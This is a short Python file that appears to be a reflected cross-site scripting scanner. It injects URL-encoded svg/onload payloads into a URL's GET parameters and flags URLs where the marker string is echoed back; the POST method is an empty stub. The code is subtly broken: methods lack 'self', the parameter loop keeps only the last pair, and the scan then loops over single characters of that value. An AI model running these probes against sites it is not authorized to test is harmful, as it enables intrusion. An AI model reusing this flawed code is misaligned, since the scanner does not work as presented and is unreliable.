import requests
import re


class XSS:

    def __init__():
        pass
         
    def xss_get(url):
        payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
        payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
        vuln = []
        data = url.split('?')[1].split('&')
        variable = []
        value = []
        for d in data :
             variable = d.split('=')[0]
             value = d.split('=')[1]
        for val in value:
            for payload in payloads:
                try:
                    req = requests.get(url.replace(val,val+payload))
                    if 'zigoo0<svg' in req.text:
                        vuln.append(url.replace(val,val+payload))
                        
                      
                except:
                    pass
        return vuln
    
    
    def xss_post(url):
        pass
    